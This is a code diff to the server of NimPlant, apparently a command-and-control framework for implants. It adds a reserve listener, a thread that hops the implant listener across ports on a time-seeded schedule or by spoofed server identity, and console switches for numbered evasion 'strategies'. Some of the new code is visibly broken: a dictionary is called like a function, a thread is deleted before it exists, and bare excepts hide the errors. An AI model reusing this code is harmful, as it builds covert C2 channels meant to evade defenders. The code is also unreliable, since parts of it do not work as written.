@@ -39,9 +39,22 @@ def main(xor_key=459457925, name=""):
     t1.start()
     nimplantPrint(f"Started management server on http://{server_ip}:{server_port}.")
 
+    t_reserve = threading.Thread(name="Listener", target=flaskListener, args=(xor_key, np_server.listenerPort))
+    t_reserve.setDaemon(True)
+    t_reserve.start()
+    nimplantPrint(
+        f"Started NimPlant reserve listener on {listenerType.lower()}://{listenerIp}:{np_server.listenerPort}. CTRL-C to cancel waiting for NimPlants."
+    )
+    configPort = np_server.listenerPort
+
     # Start another thread for NimPlant listener
     def startListener(port = listenerPort):
-        t2 = threading.Thread(name="Listener", target=flaskListener, args=(xor_key,))
+        try:
+            t2._delete()
+        except:
+            pass
+
+        t2 = threading.Thread(name="Listener", target=flaskListener, args=(xor_key, port))
         t2.setDaemon(True)
         t2.start()
         nimplantPrint(
@@ -49,7 +62,6 @@ def main(xor_key=459457925, name=""):
         )
 
     currentPort = listenerPort
-    startListener()
 
     # Start another thread to periodically check if nimplants checked in on time
     t3 = threading.Thread(name="Listener", target=periodicNimplantChecks)
@@ -59,9 +71,41 @@ def main(xor_key=459457925, name=""):
     possiblePorts = [8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087]
     list_length = len(possiblePorts)
 
+    serverNamePortDict = {"Apache": 8080, "IIS": 8081, "Nginx": 8082, "Lighttpd": 8083, "NetWare": 8084, "GWS": 8085, "Domino": 8086, "NimPlant C2 Server": 80}
+
+    def changeListenerPort(currentPort):
+        while True:
+            while(np_server.strategyThreeEnabled):
+                if(np_server.strategyOneEnabled):
+                    try:
+                        newPort = serverNamePortDict(np_server.ident)
+                    except:
+                        pass
+                else:
+                    minutes = int(datetime.now().minute//10)
+                    random.seed(minutes)
+                    index = random.randint(0, list_length - 1)
+                    newPort = possiblePorts[index]
+
+                if(newPort != np_server.listenerPort):
+                    try:
+                        np_server.listenerPort = newPort
+                        startListener(newPort)
+                    except:
+                        pass
+
+                time.sleep(1)
+            np_server.listenerPort = configPort
+            time.sleep(1)
+
+    t4 = threading.Thread(name="PortChanger", target=changeListenerPort, args=([currentPort]))
+    t4.start()
+
     # Run the console as the main thread
     while True:
         try:
+            userInput = input()
+
             if np_server.isActiveNimplantSelected():
                 promptUserForCommand()
 
@@ -70,24 +114,21 @@ def main(xor_key=459457925, name=""):
             # elif np_server.containsActiveNimplants():
                 # np_server.selectNextActiveNimplant()
 
-            elif input() == "Strategy One":
+            elif userInput == "Strategy One":
                 np_server.strategyOneEnabled = not np_server.strategyOneEnabled
                 print("Strategy 1 enabled: " + str(np_server.strategyOneEnabled))
-            elif input() == "Strategy Two":
+            elif userInput == "Strategy Two":
                 np_server.strategyTwoEnabled = not np_server.strategyTwoEnabled
                 print("Strategy 2 enabled: " + str(np_server.strategyTwoEnabled))
-            elif input() == "Strategy Two":
-                np_server.strategyTwoEnabled = not np_server.strategyTwoEnabled
-                print("Strategy 2 enabled: " + str(np_server.strategyTwoEnabled))
-
+            elif userInput == "Strategy Three":
+                np_server.strategyThreeEnabled = not np_server.strategyThreeEnabled
+                print("Strategy 3 enabled: " + str(np_server.strategyThreeEnabled))
             elif userInput == "Strategy Four":
                 np_server.strategyFourEnabled = not np_server.strategyFourEnabled
                 print("Strategy 4 enabled: " + str(np_server.strategyFourEnabled))
-
             elif userInput == "Strategy Five":
                 np_server.strategyFiveEnabled = not np_server.strategyFiveEnabled
                 print("Strategy 5 enabled: " + str(np_server.strategyFiveEnabled))
-
             elif userInput == "Strategy Six":
                 np_server.strategySixEnabled = not np_server.strategySixEnabled
                 print("Strategy 6 enabled: " + str(np_server.strategySixEnabled))
